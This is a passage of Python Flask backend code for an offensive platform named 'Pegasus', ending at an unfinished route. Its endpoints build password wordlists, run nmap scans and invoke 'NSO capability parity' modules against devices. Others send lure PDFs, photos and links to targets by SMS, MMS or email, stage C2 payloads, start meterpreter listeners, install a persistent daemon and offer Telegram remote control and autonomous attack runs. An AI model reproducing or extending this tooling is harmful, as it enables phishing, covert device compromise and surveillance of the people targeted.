                for variant in list(variants):
                    for suffix in suffixes:
                        words.append(variant + suffix)
                if digits:
                    words.append(seed + digits)
                    words.append(seed.capitalize() + digits)
            min_len = int(payload.get("min_length") or 6)
            max_len = int(payload.get("max_length") or 16)
            words = sorted({w for w in words if min_len <= len(w) <= max_len})
            ctx.log(f"  generated {len(words)} candidates")
            out_name = payload.get("output") or f"wordlist_{int(time.time())}.txt"
            out_path = settings.get_payloads_dir() / out_name
            out_path.write_text("\n".join(words), encoding="utf-8")
            ctx.log(f"  written to {out_path}")
            return {"count": len(words), "path": str(out_path), "sample": words[:40]}

        job = jobs.submit("passgen", "Wordlist generation", _fn, meta=payload)
        record_event("payload", "Wordlist generation started")
        return ok({"job": job_payload(job)})

    @app.get("/api/reports")
    def list_reports():
        directory = settings.get_reports_dir()
        reports = []
        for path in sorted(directory.glob("*"), key=lambda p: p.stat().st_mtime, reverse=True):
            if not path.is_file() or path.suffix.lower() not in (".html", ".json", ".csv", ".pdf"):
                continue
            stat = path.stat()
            reports.append(
                {
                    "name": path.name,
                    "path": str(path),
                    "format": path.suffix.lstrip(".").upper(),
                    "sizeBytes": stat.st_size,
                    "createdAt": datetime.fromtimestamp(stat.st_mtime, timezone.utc).isoformat(),
                }
            )
        return ok({"reports": reports, "directory": str(directory)})

    @app.get("/api/reports/<path:name>")
    def get_report(name: str):
        path = settings.get_reports_dir() / name
        if not path.exists() or not path.is_file():
            return fail("Report not found", 404)
        return send_file(path, max_age=0)

    @app.post("/api/reports/generate")
    def generate_report():
        payload = request.get_json(silent=True) or {}
        answers = {
            "*": [
                payload.get("title", "Pegasus Assessment"),
                payload.get("tester", os.environ.get("USERNAME") or "operator"),
                payload.get("target", ""),
                payload.get("notes", ""),
            ]
        }
        job = jobs.submit(
            "report",
            "Report generation",
            run_module_command("reporting", "report-gen", [], answers),
            meta=payload,
        )
        record_event("report", "Report generation started", payload.get("title", ""))
        return ok({"job": job_payload(job)})

    @app.get("/api/campaigns")
    def list_campaigns():
        try:
            from pegasus.modules.access_workflow.campaign_manager import CampaignManager

            manager = CampaignManager(str(settings.get_workspace_path() / "campaigns.db"))
            campaigns = [campaign.__dict__ for campaign in manager.list_campaigns()]
            stats = manager.get_global_stats()
        except Exception as exc:  # noqa: BLE001
            return ok({"campaigns": [], "stats": {}, "error": str(exc)})
        return ok({"campaigns": _jsonable(campaigns), "stats": _jsonable(stats)})

    @app.post("/api/campaigns")
    def create_campaign():
        payload = request.get_json(silent=True) or {}
        try:
            from pegasus.modules.access_workflow.campaign_manager import CampaignManager

            manager = CampaignManager(str(settings.get_workspace_path() / "campaigns.db"))
            campaign = manager.create_campaign(
                name=payload.get("name") or "Untitled campaign",
                description=payload.get("description") or "",
                client=payload.get("client") or "",
                authorization_level=payload.get("authorization") or None,
            )
        except Exception as exc:  # noqa: BLE001
            return fail(f"{type(exc).__name__}: {exc}", 500)
        record_event("campaign", f"Campaign created: {payload.get('name')}")
        return ok({"campaign": _jsonable(campaign)})

    # =====================================================================
    # Tooling endpoints
    # =====================================================================
    @app.get("/api/listeners")
    def listeners():
        host = request.args.get("host", "127.0.0.1")
        ports = request.args.get("ports")
        port_list = [int(p) for p in ports.split(",")] if ports else None
        return ok({"listeners": listener_status(host, port_list)})

    @app.post("/api/network/scan")
    def network_scan():
        payload = request.get_json(silent=True) or {}
        target = payload.get("target") or "192.168.1.0/24"
        ports = payload.get("ports") or "1-1000"

        def _fn(ctx: JobContext) -> Dict[str, Any]:
            argv = ["nmap", "-sV", "-T4", "-p", str(ports), target]
            ctx.log(f"$ {' '.join(argv)}")
            result = run(argv, timeout=float(payload.get("timeout") or 300))
            ctx.log(result["stdout"] or "")
            if result["stderr"]:
                ctx.log(result["stderr"])
            if not result["ok"] and result.get("missing"):
                raise RuntimeError("nmap is not installed or not on PATH")
            return {
                "target": target,
                "ports": ports,
                "hosts": _parse_nmap(result["stdout"]),
                "raw": result["stdout"],
            }

        job = jobs.submit("network", f"nmap {target}", _fn, meta={"target": target})
        record_event("network", f"Network scan: {target}", ports)
        return ok({"job": job_payload(job)})

    @app.post("/api/tools/<path:tool_key>/run")
    def run_tool(tool_key: str):
        payload = request.get_json(silent=True) or {}
        argv = payload.get("args") or []
        allowed = {
            "adb": "adb",
            "fastboot": "fastboot",
            "nmap": "nmap",
            "frida": "frida",
            "apktool": "apktool",
            "jadx": "jadx",
            "tshark": "tshark",
            "ngrok": "ngrok",
            "openssl": "openssl",
            "scrcpy": "scrcpy",
            "git": "git",
            "node": "node",
        }
        binary = allowed.get(tool_key)
        if not binary:
            return fail(f"Tool '{tool_key}' not permitted", 400)

        def _fn(ctx: JobContext) -> Dict[str, Any]:
            command = [binary] + [str(a) for a in argv]
            ctx.log(f"$ {' '.join(command)}")
            result = run(command, timeout=float(payload.get("timeout") or 120))
            ctx.log(result["stdout"] or "")
            if result["stderr"]:
                ctx.log(result["stderr"])
            if result.get("missing"):
                raise RuntimeError(f"{binary} is not installed")
            return {"exitCode": result["code"], "stdout": result["stdout"], "stderr": result["stderr"]}

        job = jobs.submit("tool", f"{binary} {' '.join(str(a) for a in argv)}".strip(), _fn, meta={"tool": tool_key})
        return ok({"job": job_payload(job)})

    @app.get("/api/activity")
    def activity():
        limit = int(request.args.get("limit", 100))
        kind = request.args.get("kind")
        return ok({"events": list_events(limit, kind)})
    @app.post("/api/activity")
    def post_activity():
        payload = request.get_json(silent=True) or {}
        event = record_event(
            payload.get("kind") or "note",
            payload.get("title") or "Operator note",
            payload.get("detail") or "",
            payload.get("level") or "info",
        )
        return ok({"event": event})

    # =====================================================================
    # NSO capability parity
    # =====================================================================
    @app.get("/api/nso/capabilities")
    def nso_capabilities():
        try:
            from pegasus.modules.access_workflow import nso_capabilities as engine

            capabilities = engine.list_capabilities()
            parity = engine.parity_report()
        except Exception as exc:  # noqa: BLE001
            return ok(
                {"capabilities": [], "parity": {"total": 0, "available": 0, "coverage_percent": 0, "gaps": []}, "error": str(exc)}
            )
        return ok(
            {
                "capabilities": capabilities,
                "parity": parity,
            }
        )

    @app.post("/api/nso/run/<capability>")
    def nso_run(capability: str):
        payload = request.get_json(silent=True) or {}
        serial = payload.get("serial") or request.args.get("serial")

        def _fn(ctx: JobContext) -> Dict[str, Any]:
            from pegasus.modules.access_workflow import nso_capabilities as engine

            ctx.log(f"> capability {capability}" + (f" on {serial}" if serial else ""))
            result = engine.run(capability, serial=serial) if serial else engine.run(capability)
            ctx.progress(1.0)
            return _jsonable(result)

        job = jobs.submit("capability", capability, _fn, meta={"capability": capability})
        record_event("capability", f"Capability invoked: {capability}", serial or "")
        return ok({"job": job_payload(job)})

    @app.get("/api/nso/manifest")
    def nso_manifest():
        try:
            from pegasus.modules.access_workflow import capabilities as engine

            return ok({"manifest": engine.manifest()})
        except Exception as exc:  # noqa: BLE001
            return ok({"manifest": {}, "error": str(exc)})

    # =====================================================================
    # Delivery channels and payload catalog
    # =====================================================================
    @app.get("/api/delivery/channels")
    def delivery_channels():
        from pegasus.modules.access_workflow import delivery

        return ok({"channels": delivery.list_channels(), "server": delivery.server_info()})

    @app.post("/api/delivery/send")
    def delivery_send():
        from pegasus.modules.access_workflow import delivery

        body = request.get_json(silent=True) or {}
        try:
            return ok(delivery.send(
                body.get("channel", ""), body.get("target", ""), body.get("url", ""),
                serial=body.get("serial") or None, auto_send=bool(body.get("auto_send")),
            ))
        except (delivery.DeliveryError, OSError, subprocess.TimeoutExpired) as exc:  # noqa: BLE001
            return fail(str(exc))

    @app.post("/api/delivery/serve")
    def delivery_serve():
        from pegasus.modules.access_workflow import delivery

        body = request.get_json(silent=True) or {}
        try:
            return ok(delivery.start_server(int(body.get("port", 8080))))
        except delivery.DeliveryError as exc:
            return fail(str(exc))

    @app.delete("/api/delivery/serve")
    def delivery_stop():
        from pegasus.modules.access_workflow import delivery

        return ok(delivery.stop_server())

    @app.post("/api/delivery/stage")
    def delivery_stage():
        from pegasus.modules.access_workflow import delivery

        body = request.get_json(silent=True) or {}
        try:
            delivery.start_server(int(body.get("port", 8080)))
            return ok(delivery.stage_file(body.get("path", "")))
        except (delivery.DeliveryError, OSError) as exc:
            return fail(str(exc))

    @app.get("/api/delivery/history")
    def delivery_history():
        from pegasus.modules.access_workflow import delivery

        return ok({"events": delivery.history()})

    @app.post("/api/delivery/audio")
    def delivery_audio():
        from pegasus.modules.access_workflow import delivery

        body = request.get_json(silent=True) or {}
        transcript = delivery.transcript_for(body.get("url", ""))
        path = delivery.synth_audio(transcript)
        return ok({"path": str(path), "size": path.stat().st_size, "transcript": transcript})

    @app.get("/api/catalog")
    def catalog_list():
        from pegasus.modules.access_workflow import catalog

        return ok({"vectors": catalog.list_vectors(request.args.get("category"), request.args.get("search")), "categories": catalog.categories()})

    @app.post("/api/catalog/build")
    def catalog_build():
        from pegasus.modules.access_workflow import catalog

        body = request.get_json(silent=True) or {}
        try:
            result = catalog.build_and_stage(body.get("key", "")) if body.get("stage") else catalog.build(body.get("key", ""))
        except (catalog.CatalogError, OSError, ImportError) as exc:
            return fail(str(exc))
        return ok(result)

    # =====================================================================
    # Static SPA
    # =====================================================================

    # =====================================================================
    # Logs — browse, read, download
    # =====================================================================
    @app.get("/api/logs")
    def logs_index():
        """List every log file the workspace knows about, newest first."""
        from pathlib import Path as _P

        roots = []
        base = get_settings().get_logs_dir()
        if base.exists():
            roots.append(base)
        daemon = _P.home() / ".pegasus" / "daemon"
        if daemon.exists():
            roots.append(daemon)
        files = []
        for root in roots:
            for p in root.rglob("*"):
                if p.is_file():
                    try:
                        stat = p.stat()
                        rel = p.relative_to(base) if base in p.parents or p == base else p.relative_to(root)
                        root_name = "logs" if root == base else root.name
                        files.append({
                            "id": f"{root_name}/{rel}".replace("\\", "/"),
                            "name": p.name,
                            "dir": str(p.parent),
                            "size": stat.st_size,
                            "modified": stat.st_mtime,
                        })
                    except OSError:
                        continue
        files.sort(key=lambda f: f["modified"], reverse=True)
        return ok({"logs": files, "count": len(files), "directory": str(base)})

    @app.get("/api/logs/<path:log_id>")
    def logs_read(log_id: str):
        """Read one log file (optionally tail N lines)."""
        from pathlib import Path as _P

        base = get_settings().get_logs_dir()
        daemon = _P.home() / ".pegasus" / "daemon"
        root_name, _, rel = log_id.partition("/")
        root = {"logs": base, "daemon": daemon}.get(root_name)
        if root is None or not rel:
            return fail(f"unknown log '{log_id}'", 404)
        path = (root / rel).resolve()
        if not str(path).startswith(str(root.resolve())):
            return fail("path traversal blocked", 400)
        if not path.is_file():
            return fail(f"log '{log_id}' not found", 404)
        try:
            tail = request.args.get("tail", type=int)
            text = path.read_text(encoding="utf-8", errors="replace")
            total_lines = text.count("\n") + (1 if text and not text.endswith("\n") else 0)
            if tail and tail > 0:
                lines = text.splitlines()[-tail:]
                text = "\n".join(lines)
            return ok({
                "id": log_id,
                "name": path.name,
                "size": path.stat().st_size,
                "modified": path.stat().st_mtime,
                "totalLines": total_lines,
                "content": text,
            })
        except OSError as exc:
            return fail(f"read failed: {exc}", 500)

    @app.get("/api/logs/<path:log_id>/download")
    def logs_download(log_id: str):
        """Download one log file as an attachment."""
        from pathlib import Path as _P

        base = get_settings().get_logs_dir()
        daemon = _P.home() / ".pegasus" / "daemon"
        root_name, _, rel = log_id.partition("/")
        root = {"logs": base, "daemon": daemon}.get(root_name)
        if root is None or not rel:
            return fail(f"unknown log '{log_id}'", 404)
        path = (root / rel).resolve()
        if not str(path).startswith(str(root.resolve())):
            return fail("path traversal blocked", 400)
        if not path.is_file():
            return fail(f"log '{log_id}' not found", 404)
        return send_file(path, as_attachment=True, download_name=path.name)

    @app.get("/api/logs/combined/download")
    def logs_combined_download():
        """Download every log concatenated into one file."""
        from pathlib import Path as _P
        import io as _io

        base = get_settings().get_logs_dir()
        daemon = _P.home() / ".pegasus" / "daemon"
        buf = _io.StringIO()
        seen_any = False
        for root, label in ((base, "logs"), (daemon, "daemon")):
            if not root.exists():
                continue
            for p in sorted(root.rglob("*")):
                if not p.is_file():
                    continue
                try:
                    buf.write(f"===== {label}/{p.relative_to(root)} =====\n")
                    buf.write(p.read_text(encoding="utf-8", errors="replace"))
                    buf.write("\n\n")
                    seen_any = True
                except OSError:
                    continue
        if not seen_any:
            return fail("no logs to export", 404)
        data = buf.getvalue().encode("utf-8")
        resp = send_file(
            _io.BytesIO(data),
            as_attachment=True,
            download_name=f"pegasus-logs-{int(time.time())}.txt",
            mimetype="text/plain",
        )
        return resp

    # =====================================================================
    # Telegram remote control
    # =====================================================================
    from pegasus.modules.access_workflow import telegram_control as _tg

    @app.get("/api/telegram/status")
    def telegram_status():
        cfg = _tg.load_config()
        running = _tg.is_running() if hasattr(_tg, "is_running") else _tg._bot is not None
        return ok({
            "configured": bool(cfg.get("token") and cfg.get("chat_id")),
            "running": bool(running),
            "bot": cfg.get("bot"),
            "chatId": cfg.get("chat_id"),
        })

    @app.post("/api/telegram/setup")
    def telegram_setup():
        body = request.get_json(silent=True) or {}
        token = body.get("token") or ""
        chat_id = body.get("chatId") or body.get("chat_id") or ""
        if not token:
            return fail("token required")
        try:
            result = _tg.setup(token, chat_id)
        except Exception as exc:  # noqa: BLE001
            return fail(f"{type(exc).__name__}: {exc}")
        return ok(result)

    @app.post("/api/telegram/start")
    def telegram_start():
        try:
            result = _tg.start_bot()
        except Exception as exc:  # noqa: BLE001
            return fail(f"{type(exc).__name__}: {exc}")
        record_event("telegram", "Telegram remote control started")
        return ok(result)

    @app.post("/api/telegram/stop")
    def telegram_stop():
        return ok({"stopped": _tg.stop_bot()})

    @app.post("/api/telegram/message")
    def telegram_message():
        body = request.get_json(silent=True) or {}
        text = body.get("text") or ""
        if not text:
            return fail("text required")
        try:
            return ok(_tg.send_message(text))
        except Exception as exc:  # noqa: BLE001
            return fail(f"{type(exc).__name__}: {exc}")

    # =====================================================================
    # Infrastructure — daemon/service install, C2 static paths, health
    # =====================================================================
    from pegasus.modules.access_workflow import daemon_service as _daemon_mod

    @app.get("/api/infrastructure/health")
    def infrastructure_health():
        """Health check across every component the infrastructure runs on."""
        from pegasus.core.services import _port_open
        from pegasus.core.config import port as _port
        from pegasus.ui.web.backend.tools import scan_tools
        tools = {t["key"]: t["available"] for t in scan_tools()}
        checks = {
            "web-api": _port_open(_port()),
            "adb-server": _port_open(5037),
            "meterpreter": _port_open(4444),
            "msfrpcd": _port_open(55553),
            "http-proxy": _port_open(8080),
            "https-proxy": _port_open(8443),
        }
        overall = all(checks.values()) and tools.get("adb", False)
        return ok({
            "overall": "healthy" if overall else "degraded",
            "services": [{"name": k, "healthy": v} for k, v in checks.items()],
            "tools": [{"name": k, "available": v} for k, v in tools.items()],
            "checkedAt": time.time(),
        })

    @app.post("/api/infrastructure/install")
    def infrastructure_install():
        """Register the Pegasus daemon as a service (NSSM) or scheduled task."""
        body = request.get_json(silent=True) or {}
        name = body.get("name", "PegasusDaemon")
        daemon = _daemon_mod.get_daemon(body.get("host", "127.0.0.1"), body.get("port", 5050))
        result = daemon.install_service(name)
        record_event("infrastructure", f"Service installed: {name} ({result['mode']})")
        return ok(result)

    @app.post("/api/infrastructure/uninstall")
    def infrastructure_uninstall():
        body = request.get_json(silent=True) or {}
        name = body.get("name", "PegasusDaemon")
        daemon = _daemon_mod.get_daemon()
        result = daemon.uninstall_service(name)
        record_event("infrastructure", f"Service uninstalled: {name}")
        return ok(result)

    @app.get("/api/infrastructure/service")
    def infrastructure_service_status():
        """Report whether the daemon service is registered (NSSM or schtasks)."""
        import shutil as _shutil
        import subprocess as _sp

        out = {}
        for mode, probe in (
            ("windows-service", ["nssm", "status", "PegasusDaemon"]),
            ("scheduled-task", ["schtasks", "/Query", "/TN", "PegasusDaemon"]),
        ):
            binary = probe[0]
            if _shutil.which(binary):
                proc = _sp.run(probe, capture_output=True, text=True, timeout=15)
                out[mode] = {"registered": proc.returncode == 0, "detail": (proc.stdout or proc.stderr or "").strip()[:200]}
            else:
                out[mode] = {"registered": False, "detail": f"{binary} not installed"}
        return ok(out)

    @app.get("/api/c2/paths")
    def c2_static_paths():
        """C2 payload staging paths and their on-disk state."""
        from pegasus.core.config import get_settings

        settings = get_settings()
        payloads = settings.get_payloads_dir()
        entries = []
        if payloads.exists():
            for p in sorted(payloads.iterdir()):
                if p.is_file():
                    entries.append({
                        "name": p.name,
                        "size": p.stat().st_size,
                        "modified": p.stat().st_mtime,
                        "url": f"http://127.0.0.1:8080/{p.name}",
                    })
        return ok({"directory": str(payloads), "files": entries, "count": len(entries)})

    # =====================================================================
    # Skills & agent families
    # =====================================================================
    @app.get("/api/skills")
    def skills_catalog():
        """Live skill-pack catalog from the repo's .openfable-skills directory."""
        import pathlib

        skills = []
        roots = [
            pathlib.Path.cwd() / ".openfable-skills",
            pathlib.Path.cwd() / ".mimocode-skills",
        ]
        seen = set()
        for root in roots:
            if not root.exists():
                continue
            for mf in sorted(root.glob("*.json")):
                if mf.name == "skill.json" or mf.name in seen:
                    continue
                try:
                    data = json.loads(mf.read_text(encoding="utf-8"))
                except Exception:
                    continue
                seen.add(mf.name)
                name = data.get("name") or mf.stem
                skills.append({
                    "id": mf.stem,
                    "name": name,
                    "file": mf.name,
                    "root": root.name,
                    "version": data.get("version", ""),
                    "description": data.get("description", ""),
                    "category": data.get("category", "general"),
                    "trigger": data.get("trigger", ""),
                    "commands": data.get("commands", 0),
                    "author": data.get("author", ""),
                })
        return ok({"skills": skills, "count": len(skills)})

    @app.get("/api/agents/families")
    def agent_families():
        """Agent families available for dispatch, with their linked commands."""
        from pegasus.modules.access_workflow.zero_click import device_families
        from pegasus.modules.access_workflow import capabilities as _caps

        families = [
            {
                "id": "android",
                "label": "Android",
                "description": "ADB/fastboot/FRP rooting, payload delivery, post-exploit.",
                "commands": ["adb-devices", "frp-bypass", "post-exploitation", "generate-payload"],
                "zeroClickFamilies": sorted(
                    f for f in device_families() if f not in ("windows", "linux", "macos", "ios")
                ),
            },
            {
                "id": "iot",
                "label": "IoT / Hardware",
                "description": "Firmware inspection, CAN bus, embedded exploitation.",
                "commands": ["netscan", "exploit"],
                "zeroClickFamilies": [],
            },
            {
                "id": "windows",
                "label": "Windows",
                "description": "Zero-click RCE, privilege escalation, persistence.",
                "commands": ["create-exe", "exploit"],
                "zeroClickFamilies": [],
            },
            {
                "id": "linux",
                "label": "Linux",
                "description": "Privesc, hardening, service exploitation.",
                "commands": ["exploit", "harden-device"],
                "zeroClickFamilies": [],
            },
            {
                "id": "macos",
                "label": "macOS",
                "description": "Persistence, DMG delivery.",
                "commands": ["create-dmg", "exploit"],
                "zeroClickFamilies": [],
            },
            {
                "id": "c2",
                "label": "C2",
                "description": "Command and control channels, listeners, beacons.",
                "commands": ["create-rat-agent", "post-exploitation"],
                "zeroClickFamilies": [],
            },
            {
                "id": "payload",
                "label": "Payload",
                "description": "Payload generation, mutation, steganography.",
                "commands": ["generate-payload", "create-exploit"],
                "zeroClickFamilies": [],
            },
            {
                "id": "exploitation",
                "label": "Exploitation",
                "description": "General exploitation orchestration.",
                "commands": ["exploit", "post-exploitation", "audit-security"],
                "zeroClickFamilies": [],
            },
        ]
        try:
            manifest = _caps.manifest()
        except Exception:  # noqa: BLE001
            manifest = {}
        return ok({"families": families, "count": len(families), "manifest": manifest})

    # =====================================================================
    # Tool installer + service control
    # =====================================================================
    from pegasus.core import tool_installer as _installer
    from pegasus.core import services as _services_mod
    from pegasus.core.config import port as _port_fn

    @app.get("/api/tools/missing")
    def tools_missing():
        scan = scan_tools()
        return ok({"missing": [t for t in scan if not t["available"]]})

    @app.post("/api/tools/install")
    def tools_install():
        body = request.get_json(silent=True) or {}
        keys = body.get("tools")
        results = _installer.install_missing(keys)
        record_event("tools", "Tool install: " + ", ".join(f"{r['key']}={r['status']}" for r in results))
        return ok({"results": results})

    @app.get("/api/services/status")
    def services_status():
        checks = [
            {"service": "adb-server", "port": 5037},
            {"service": "adb-tcp", "port": 5555},
            {"service": "meterpreter", "port": 4444},
            {"service": "msfrpcd", "port": 55553},
            {"service": "http-proxy", "port": 8080},
            {"service": "https-proxy", "port": 8443},
            {"service": "pegasus-api", "port": _port_fn()},
        ]
        return ok({"services": [{**c, "open": _services_mod._port_open(c["port"])} for c in checks]})

    @app.post("/api/services/start")
    def services_start():
        body = request.get_json(silent=True) or {}
        keys = body.get("services")
        fns = {
            "adb-server": _services_mod.start_adb_server,
            "adb-tcp": _services_mod.start_adb_tcp,
            "meterpreter": _services_mod.start_meterpreter,
            "msfrpcd": _services_mod.start_msfrpcd,
            "http-proxy": _services_mod.start_http_proxy,
            "https-proxy": _services_mod.start_https_proxy,
        }
        if keys:
            out = []
            for k in keys:
                fn = fns.get(k)
                out.append(fn() if fn else {"service": k, "status": "unknown"})
            return ok({"results": out})
        return ok({"results": _services_mod.start_all()})

    # =====================================================================
    # Setup wizard (item 6/11) — real provider registry
    # =====================================================================
    from pegasus.modules.ai import providers as _providers
    from pegasus.modules.ai import local_models as _lm

    @app.before_request
    def _setup_gate():
        """Block the app until at least one provider key or local model exists."""
        if not _providers.needs_setup():
            return None
        allow = (
            request.path.startswith("/api/setup"),
            request.path.startswith("/api/health"),
            request.path.startswith("/api/models"),
            request.path.startswith("/api/auth"),
            request.path.startswith("/api/agents"),
            request.path == "/api/system",
            not request.path.startswith("/api/"),
        )
        if any(allow):
            return None
        return fail("setup required", 428)

    @app.get("/api/setup/state")
    def get_setup_state():
        data = _providers.load()
        return ok({
            "needsSetup": _providers.needs_setup(),
            "providers": [{"id": k, **v} for k, v in _providers.REGISTRY.items()],
            "configured": _providers.configured(),
            "default": data.get("default"),
            "fallback": data.get("fallback"),
            "localModel": _lm.installed_default(),
            "platform": _lm.platform_tier(),
        })

    @app.post("/api/setup/providers")
    def post_setup_providers():
        body = request.get_json(silent=True) or {}
        data = _providers.load()
        for name, key in (body.get("keys") or {}).items():
            if name in _providers.REGISTRY and key:
                data.setdefault("keys", {})[name] = key
        if body.get("default"):
            data["default"] = body["default"]
        if body.get("fallback"):
            data["fallback"] = body["fallback"]
        if body.get("localModel"):
            data["localModel"] = body["localModel"]
        _providers.save(data)
        if not data.get("fallback") and not data.get("default"):
            return fail("Set a default or fallback so requests have a route")
        return ok({"configured": _providers.configured(), "default": data.get("default")})

    @app.post("/api/setup/skip")
    def post_setup_skip():
        data = _providers.load()
        data["default"] = "local"
        _providers.save(data)
        return ok({"default": "local"})

    @app.post("/api/nl/command")
    def nl_command():
        payload = request.get_json(silent=True) or {}
        text = (payload.get("text") or "").strip()
        execute = payload.get("execute", False)
        if not text:
            return fail("text required")
        try:
            from pegasus.modules.ai.nl import translate
            pm = plugin_manager()
            names = sorted(pm.context.commands.keys()) if pm else []
            guess = translate(text, names)
        except Exception as exc:  # noqa: BLE001
            guess = {"command": None, "confidence": 0.0, "why": f"translator unavailable: {exc}"}
        command = guess.get("command") or ""
        confidence = float(guess.get("confidence") or 0.0)
        if not command or command not in (names or [command]):
            return ok({"command": None, "confidence": confidence, "why": guess.get("why", "no match"), "executed": False})
        if not execute or confidence < 0.5:
            return ok({"command": command, "confidence": confidence, "why": guess.get("why", ""), "executed": False})
        argv = (guess.get("args") or [])
        if isinstance(argv, str):
            argv = argv.split()
        job = jobs.submit(
            "command", f"NL: {command}", run_slash_command(command.lstrip("/"), [str(a) for a in argv]),
        )
        report_job(job.id, "command", f"NL dispatched: {command}")
        return ok({"command": command, "confidence": confidence, "why": guess.get("why", ""), "executed": True, "job": job_payload(job)})

    # =====================================================================
    # Autonomous lifecycle (item 12)
    # =====================================================================
    from pegasus.modules.autonomous import engine as _auto_engine

    @app.post("/api/autonomous/start")
    def autonomous_start():
        body = request.get_json(silent=True) or {}
        started = _auto_engine.start(body)
        record_event("autonomous", f"Autonomous run started: {started['run_id']}")
        return ok(started)

    @app.get("/api/autonomous/<run_id>")
    def autonomous_get(run_id: str):
        r = _auto_engine.get(run_id)
        if r is None:
            return fail("unknown run", 404)
        return ok(r)

    @app.post("/api/autonomous/<run_id>/decision")
    def autonomous_decision(run_id: str):
        body = request.get_json(silent=True) or {}
        r = _auto_engine.decision(run_id, body.get("action", ""))
        if "error" in r:
            return fail(r["error"], 409)
        record_event("autonomous", f"Decision {body.get('action')} on {run_id}")
        return ok(r)

    # =====================================================================
    # Local model management (item 7)
    # =====================================================================
    @app.get("/api/models/recommended")
    def models_recommended():
        return ok({"models": _lm.recommended(), "platform": _lm.platform_tier()})

    @app.get("/api/models/installed")
    def models_installed():
        return ok({"installed": _lm.installed(), "default": _lm.installed_default()})

    @app.post("/api/models/download")
    def models_download():
        body = request.get_json(silent=True) or {}
        mid = body.get("model") or ""
        filename = body.get("filename") or ""
        if not mid or not filename:
            return fail("model and filename required")

        def _dl(ctx):
            p = _lm.download(mid, filename)
            ctx.log(f"downloaded {p.name}")
            return {"path": str(p), "gb": round(p.stat().st_size / 1e9, 2)}

        job = jobs.submit("model-download", f"Download {filename.split('/')[-1]}", _dl)
        return ok({"job": job_payload(job)})

    @app.post("/api/models/select")
    def models_select():
        body = request.get_json(silent=True) or {}
        data = _providers.load()
        data["localModel"] = body.get("model")
        data.setdefault("keys", {})
        if not data.get("default"):
            data["default"] = "local"
        _providers.save(data)
        return ok({"selected": body.get("model"), "default": data.get("default")})

    @app.post("/api/models/serve")
    def models_serve():
        body = request.get_json(silent=True) or {}
        filename = body.get("filename") or ""
        if not filename:
            return fail("filename required")
        p = _lm.MODELS / filename.split("/")[-1]
        if not p.exists():
            return fail("model not downloaded", 404)
        try:
            url = _lm.serve(p, body.get("port", 8081))
            return ok({"url": url})
        except RuntimeError as exc:
            return fail(str(exc))

    @app.delete("/api/models/serve")
    def models_serve_stop():
        proc = getattr(_lm, "_RUNNING", {}).get("proc")
        port = getattr(_lm, "_RUNNING", {}).get("port")
        if proc:
            proc.terminate()
        _lm._RUNNING.clear()
        return ok({"stopped": bool(proc), "port": port})

    # =====================================================================
    # Agent bridge (item 9)
    # =====================================================================
    from pegasus.modules.agents import bridge as _agents

    @app.get("/api/agents/config")
    def agents_config():
        return ok(_agents.load())

    @app.post("/api/agents/config")
    def agents_config_save():
        body = request.get_json(silent=True) or {}
        _agents.save(body)
        return ok({"saved": True})

    @app.get("/api/agents/available")
    def agents_available():
        return ok(_agents.available())

    @app.post("/api/agents/dispatch")
    def agents_dispatch():
        body = request.get_json(silent=True) or {}
        prompt = body.get("prompt") or ""
        if not prompt:
            return fail("prompt required")

        def _run(ctx):
            return _agents.dispatch(prompt, body.get("cwd", "."))

        job = jobs.submit("agent", f"Agent: {prompt[:40]}", _run)
        return ok({"job": job_payload(job)})

    # =====================================================================
    # Delivery carriers (item 10) — PDF / photo / link wrapper
    # =====================================================================
    from pegasus.modules.delivery import landing as _landing
    from pegasus.modules.delivery import carriers as _carriers
    from pegasus.modules.delivery import twilio_channel as _twilio

    @app.post("/api/delivery/carrier")
    def delivery_carrier():
        body = request.get_json(silent=True) or {}
        target = body.get("target") or ""
        channel = body.get("channel", "sms")
        kind = _twilio.carrier_for(channel, body.get("carrier", "pdf"))
        if not target:
            return fail("target required")
        payload_url = body.get("url") or ""
        if not payload_url:
            return fail("url required")
        try:
            if kind == "link":
                token = _landing.mint({"pdf": payload_url, "apk": payload_url, "photo": payload_url})
                url = f"{request.host_url.rstrip('/')}/l/{token}"
                result = _twilio.send(channel if channel != "sms" else "sms", target,
                                      body.get("text") or "Open: " + url, media_url=url)
                return ok({"kind": "link", "url": url, "result": str(result)})
            # build the artifact
            import tempfile
            from pegasus.core.config import get_settings
            stage_dir = get_settings().get_payloads_dir()
            out = str(stage_dir / f"carrier-{int(time.time())}.{kind if kind != 'pdf_lure' else 'pdf'}")
            if kind in ("pdf", "pdf_lure"):
                _carriers.build_pdf(out, payload_url, body.get("label", "Document"))
            elif kind == "photo":
                src = body.get("photo_src")
                if not src:
                    return fail("photo_src required for photo carrier")
                _carriers.build_photo(src, out, payload_url)
            else:
                return fail(f"unsupported carrier {kind}")
            if channel == "email":
                result = _twilio.send_email(target, body.get("subject", "Document"),
                                           body.get("text", "See attachment."), attachment=out)
            elif channel == "mms":
                result = _twilio.send_mms(target, body.get("text", ""), payload_url)
            else:
                result = _twilio.send_sms(target, body.get("text", "Open: " + payload_url))
            return ok({"kind": kind, "artifact": out, "result": str(result)})
        except RuntimeError as exc:
            return fail(str(exc))
        except Exception as exc:  # noqa: BLE001
            return fail(f"{type(exc).__name__}: {exc}")

    # Landing routes
    @app.post("/api/delivery/link")
    def delivery_link():
        body = request.get_json(silent=True) or {}
        artifacts = body.get("artifacts") or {}
        if not artifacts:
            return fail("artifacts required")
        token = _landing.mint(artifacts)
        return ok({"token": token, "url": f"{request.host_url.rstrip('/')}/l/{token}"})

    @app.get("/l/<token>")
    def landing_redirect(token: str):
        from flask import redirect
        arts = _landing.resolve(token)
        if arts is None:
            return fail("unknown link", 404)
        target = _landing.pick(arts, request.headers.get("User-Agent", ""))
        if not target:
            return fail("no artifact for this client", 406)
        return redirect(target, code=302)

    # =====================================================================
    # OAuth broker (item 11)
    # =====================================================================
    from pegasus.modules.oauth import broker as _oauth

    @app.get("/api/oauth/login/<provider>")
    def oauth_login(provider: str):
        redirect_uri = f"{request.host_url.rstrip('/')}/api/oauth/callback/{provider}"
        try:
            out = _oauth.begin(provider, redirect_uri)
        except (RuntimeError, KeyError) as exc:
            return fail(str(exc), 400)
        from flask import redirect as _rd
        return _rd(out["url"], code=302)

    @app.get("/api/oauth/callback/<provider>")
    def oauth_callback(provider: str):
        code = request.args.get("code", "")
        state = request.args.get("state", "")
        if not code:
            return fail("missing code", 400)
        try:
            _oauth.complete(provider, code, state)
        except RuntimeError as exc:
            return fail(str(exc), 400)
        from flask import redirect as _rd
        return _rd(f"/settings?linked={provider}", code=302)

    @app.post("/api/oauth/telegram")
